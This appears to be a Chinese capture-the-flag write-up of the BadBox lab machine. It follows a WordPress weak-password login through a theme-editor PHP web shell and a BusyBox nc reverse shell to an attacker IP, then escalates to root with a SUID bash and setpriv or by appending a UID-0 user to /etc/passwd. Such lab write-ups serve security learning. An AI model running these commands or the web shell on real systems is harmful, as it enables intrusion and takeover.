# BadBox 靶机复盘：从 WordPress 到 Landlock 提权

> 本文记录的是隔离环境中的授权靶机复盘。密码攻击、主题文件注入、反弹 Shell 与 SUID 利用均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | BadBox / Alpine Linux |
| 目标地址 | 192.168.134.60 |
| 攻击机 | 192.168.134.4 |
| Web 栈 | Apache 2.4.66、PHP 8.4.17、WordPress 7.0 |
| 开放端口 | 22/tcp、80/tcp |
| 最终路径 | WordPress 弱口令 → 主题编辑器 WebShell → BusyBox 反弹 Shell → SUID Bash → setpriv root |

![BadBox 靶机启动页](/content/badbox/image-01.png)

## 1. 攻击链概览

这台靶机的入口并不复杂，真正值得复盘的是最后一段权限边界：拿到 apache Shell 后，普通的 SUID Bash 仍受到 Landlock 规则影响，需要同时修正真实 UID/GID，才能得到不再受原进程限制的 root Shell。

```text
端口枚举
  → WordPress 用户枚举
  → 弱口令登录后台
  → 修改主题 functions.php
  → BusyBox nc 反弹 Shell
  → 枚举 SUID Bash
  → setpriv 切换真实 UID/GID
  → root
```

## 2. 枚举：从 80 端口确认 WordPress

先进行全端口扫描并识别服务：

```bash
nmap -sT -sV -sC -O -p- 192.168.134.60
```

扫描结果只暴露 SSH 与 HTTP。Web 端返回 Apache 2.4.66，并能识别到 WordPress 7.0。

![Nmap 端口与服务识别结果](/content/badbox/image-02.png)

查看页面源码时发现站点引用了 badbox.dsz，因此把域名映射到靶机地址：

```bash
echo "192.168.134.60 badbox.dsz" | sudo tee -a /etc/hosts
```

![页面源码中泄露的 badbox.dsz 域名](/content/badbox/image-03.png)

随后使用 WPScan 枚举用户：

```bash
wpscan --url http://192.168.134.60 --enumerate u
```

结果识别出用户 yepian，同时确认 XML-RPC、上传目录列表与外部 WP-Cron 均处于可访问状态。

![WPScan 枚举出 yepian 用户](/content/badbox/image-04.png)

> 风险说明：用户枚举和口令测试会产生明显请求日志，也可能触发账户锁定。这里仅在本地靶场内验证。

## 3. 利用：后台主题编辑器到反弹 Shell

针对 yepian 进行授权口令验证后，得到靶场弱口令：

```text
yepian / 11111111
```

登录 WordPress 后台，进入主题文件编辑器，在 Twenty Twenty-Five 的 functions.php 中加入受 c 参数控制的命令执行入口：

```php
<?php
if (isset($_GET['c'])) {
    system($_GET['c']);
}
?>
```

![使用 yepian 登录 WordPress 后台](/content/badbox/image-05.png) ![在 functions.php 中加入命令执行入口](/content/badbox/image-06.png)

攻击机先监听 4444 端口，再通过 c 参数调用 BusyBox nc：

```bash
# Kali
nc -lvnp 4444

# 通过 WebShell 触发
busybox nc 192.168.134.4 4444 -e /bin/sh
```

![通过主题入口触发 BusyBox nc 回连](/content/badbox/image-07.png) ![获得 apache 身份的反弹 Shell](/content/badbox/image-08.png)

回连成功后，当前目录位于 /var/www/html/wp-admin，进程身份为 apache。继续枚举 yepian 的家目录并读取 user flag。

![读取 yepian 用户目录中的 user flag](/content/badbox/image-09.png)

## 4. 提权：SUID Bash、BusyBox 与 Landlock

枚举 root 所有且带 SUID 位的文件：

```bash
find / -user root -perm -4000 -print 2>/dev/null
```

![发现 /tmp/bash 与 /var/tmp/bash 两个 SUID Bash](/content/badbox/image-10.png)

这里有两个容易混淆的点：

- /tmp/bash 位于 nosuid 挂载点，SUID 不会生效。
- /var/tmp/bash 可以保留 EUID=0，但原 Shell 的 Landlock 文件访问限制仍可能继续生效。
- BusyBox 工具链还会主动处理权限，不能简单把“看到 EUID=0”等同于“完整 root 能力”。

### 推荐解法：用 setpriv 修正真实身份

```bash
/var/tmp/bash -p -c 'setpriv --reuid=0 --regid=0 --clear-groups /bin/sh'
```

这条命令从 SUID Bash 启动新 Shell，并把真实 UID、真实 GID 与附加组一起切换到 root。验证 id 后可以进入 /root 并读取 root flag。

![setpriv 后获得完整 root Shell](/content/badbox/image-11.png)

### 备选思路：写入用户后重新 SSH

部分写操作可以借助 Shell 重定向完成，因此也可以追加一个 UID 0 用户，再通过 SSH 创建不继承原 Landlock 限制的新进程：

```bash
LINE="dep:\$1\$dp\$hash:0:0:root:/root:/bin/bash"
B64=$(printf '%s\n' "$LINE" | base64 -w0)

echo 'BASE64_STRING' | base64 -d >> /etc/passwd
ssh dep@192.168.134.60
```

> 这条路径会直接改动 /etc/passwd，侵入性更强，也更容易破坏实验环境。复盘中保留它用于说明边界，实际解题优先选择 setpriv。

## 5. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| WordPress 枚举 | 页面元数据、作者 ID 与 WPScan 可以共同暴露有效用户名 |
| 主题编辑器 | 后台文件编辑权限可以直接转化为服务端代码执行 |
| BusyBox 降权 | 工具链可能主动改变身份，不能只依赖传统 Bash 提权经验 |
| SUID 与 nosuid | 文件权限位存在不代表挂载点允许其生效 |
| Landlock LSM | EUID=0 也不一定解除进程已经继承的文件访问约束 |
| setpriv | 同时修正真实 UID/GID 和附加组，才得到完整 root 上下文 |

## 6. 复盘

BadBox 的前半段是一条典型 WordPress 弱口令链，后半段则提醒我：Linux 权限判断不只看 EUID。遇到“已经是 root 却仍然读不了文件”的现象，应同时检查挂载参数、LSM、真实 UID/GID、附加组以及进程继承关系。

参考：靶机作者关于 BusyBox 与提权边界的说明
https://the0n3.top/posts/busybox138/
